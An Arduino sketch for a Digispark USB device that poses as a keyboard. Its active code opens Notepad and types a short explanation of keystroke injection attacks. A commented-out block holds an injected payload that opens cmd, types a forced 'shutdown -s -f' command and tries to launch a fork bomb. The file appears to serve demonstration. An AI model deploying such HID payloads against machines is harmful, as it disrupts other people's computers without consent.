#include "DigiKeyboard.h"

void setup() {
  // don't need to set anything up to use DigiKeyboard
  pinMode(1,OUTPUT);
  int i=400;
  while(i>0){
    digitalWrite(1,HIGH);
    DigiKeyboard.delay(i);
    digitalWrite(1,LOW);
    DigiKeyboard.delay(i);
    i -= 10;
  }
  digitalWrite(1,HIGH);
}


void loop() {
  DigiKeyboard.sendKeyStroke(0);
  /*
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(0,MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("cmd");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  DigiKeyboard.println("shutdown -s -f -t 30 -c \"That was a mistake, but I choose to forgive you.\"");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  //DigiKeyboard.delay(1000);
  
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(0,MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("Fork bomb");
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  DigiKeyboard.delay(5000);
  */
  DigiKeyboard.sendKeyStroke(0,MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("notepad");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.println("Keystroke injection attack is a cyber attack that exploits the fact that keyboards and other HIDs are essentially trusted.");
  DigiKeyboard.delay(50);
  DigiKeyboard.println("This can be carried out by any device that pretends to be an HID and unleashes pre-programmed script into the host.");
  DigiKeyboard.delay(50);
  DigiKeyboard.println("Once into host system, from forkbombs,ransomware to trojan horses...sky is the limit.");
  DigiKeyboard.delay(50);
  DigiKeyboard.println("\n~ysr");
  DigiKeyboard.delay(50);
  
  while (true){
    DigiKeyboard.delay(5000);
    /*
    DigiKeyboard.sendKeyStroke(0,MOD_GUI_LEFT|KEY_E);
    DigiKeyboard.delay(50);
    */
  }
}
